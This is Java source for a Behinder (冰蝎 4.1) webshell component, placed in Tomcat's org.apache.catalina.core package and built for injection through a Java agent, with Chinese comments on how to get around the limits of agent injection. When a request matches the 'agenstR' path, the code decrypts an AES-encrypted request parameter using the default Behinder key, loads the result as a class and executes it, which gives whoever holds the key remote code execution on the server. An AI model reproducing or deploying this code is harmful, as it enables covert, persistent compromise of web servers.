package org.apache.catalina.core;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

//这里，我也想使用原始的办法进行加载，但agent注入是不允许产生新类和新函数的。
//所以还是被迫在多个环境中进行类加载
public class RebeyondServices {
    public static String SERVICE_URL="agenstR";

    //（自定义类在agent中调用不到），这里使用反射加载
    //传进来就变成RequestFacade 所以必要操作在函数外做掉
    //这里用的是4.1 冰蝎
    public static void doServices(java.util.Map rdd,Object obj) //抛出表比我命还长
            throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException {
        System.out.println("Rebeyond"+SERVICE_URL);
        if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.RebeyondServices.SERVICE_URL)) { //
            String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，?默认连接密码rebeyond*/ //
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES"); //
            c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES")); //
            byte[] data = new sun.misc.BASE64Decoder().decodeBuffer((String) rdd.get("b")); //
            Class clazz = org.apache.catalina.core.utils.Util.extendClassLoader(c.doFinal(data));
            System.out.println(clazz);
            clazz.newInstance().equals(obj);
        }
    }

}
